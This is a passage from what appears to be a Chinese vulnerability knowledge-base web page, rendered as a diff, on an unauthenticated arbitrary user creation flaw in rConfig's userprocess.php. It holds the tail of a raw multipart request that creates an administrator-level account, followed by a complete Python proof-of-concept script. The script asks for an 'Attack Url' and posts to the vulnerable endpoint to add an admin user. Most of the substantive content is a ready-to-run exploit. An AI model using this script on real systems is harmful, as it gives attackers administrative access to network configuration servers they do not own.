+</span></span><span class="line"><span class="cl">--b1467349fcce4aa0ae8d44439f4e06bc
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;email&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">testtest@test.com
+</span></span><span class="line"><span class="cl">--b1467349fcce4aa0ae8d44439f4e06bc
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;ulevelid&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">9
+</span></span><span class="line"><span class="cl">--b1467349fcce4aa0ae8d44439f4e06bc
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;add&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">add
+</span></span><span class="line"><span class="cl">--b1467349fcce4aa0ae8d44439f4e06bc
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;editid&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--b1467349fcce4aa0ae8d44439f4e06bc--
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202162241827.png"
+        data-srcset="/images/202202162241827.png, /images/202202162241827.png 1.5x, /images/202202162241827.png 2x"
+        data-sizes="auto"
+        alt="/images/202202162241827.png"
+        title="/images/202202162241827.png" /></p>
+<p>成功创建用户 testtest，以管理员身份登录后台</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202162242368.png"
+        data-srcset="/images/202202162242368.png, /images/202202162242368.png 1.5x, /images/202202162242368.png 2x"
+        data-sizes="auto"
+        alt="/images/202202162242368.png"
+        title="/images/202202162242368.png" /></p>
+<h2 id="漏洞poc">漏洞POC</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-*- coding:utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># author : PeiQi</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># from   : http://wiki.peiqi.tech</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">requests.packages.urllib3.exceptions</span> <span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">requests_toolbelt.multipart.encoder</span> <span class="kn">import</span> <span class="n">MultipartEncoder</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">title</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mPOC_Des: http://wiki.peiqi.tech                                   </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mGithub : https://github.com/PeiQi0                                 </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34m公众号  : PeiQi文库                                                   </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mVersion: rConfig userprocess.php 任意用户创建漏洞                     </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36m使用格式:  python3 poc.py                                            </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">POC_1</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vuln_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&#34;/lib/crud/userprocess.php&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">referer</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&#34;useradmin.php&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ran_number</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">999</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">origin</span> <span class="o">=</span> <span class="n">target_url</span>
+</span></span><span class="line"><span class="cl">    <span class="n">multipart_data</span> <span class="o">=</span> <span class="n">MultipartEncoder</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fields</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;testtest</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ran_number</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;testtest@</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ran_number</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;passconf&#39;</span><span class="p">:</span> <span class="s1">&#39;testtest@</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ran_number</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="s1">&#39;testtest</span><span class="si">{}</span><span class="s1">@test.com&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ran_number</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;ulevelid&#39;</span><span class="p">:</span> <span class="s1">&#39;9&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;add&#39;</span><span class="p">:</span> <span class="s1">&#39;add&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;editid&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="n">multipart_data</span><span class="o">.</span><span class="n">content_type</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">referer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">               <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">origin</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="s1">&#39;testtest</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ran_number</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[36m[o] 正在创建账户..... </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ran_number</span><span class="p">,</span> <span class="n">ran_number</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">vuln_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">multipart_data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;error&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[36m[o] 成功创建账户 testtest</span><span class="si">{}</span><span class="s2">/testtest@</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ran_number</span><span class="p">,</span> <span class="n">ran_number</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[31m[x] 创建失败:</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败:</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">title</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">target_url</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[35mPlease input Attack Url</span><span class="se">\n</span><span class="s2">Url   &gt;&gt;&gt; </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">POC_1</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202162242409.png"
+        data-srcset="/images/202202162242409.png, /images/202202162242409.png 1.5x, /images/202202162242409.png 2x"
+        data-sizes="auto"
+        alt="/images/202202162242409.png"
+        title="/images/202202162242409.png" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/" data-title="rConfig userprocess.php 任意用户创建漏洞" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/" data-title="rConfig userprocess.php 任意用户创建漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/" data-title="rConfig userprocess.php 任意用户创建漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/" data-title="rConfig userprocess.php 任意用户创建漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/readme/" class="prev" rel="prev" title="README"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>README</a>
+            <a href="/rconfig-useradmin.inc.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="rConfig useradmin.inc.php 信息泄露漏洞">rConfig useradmin.inc.php 信息泄露漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
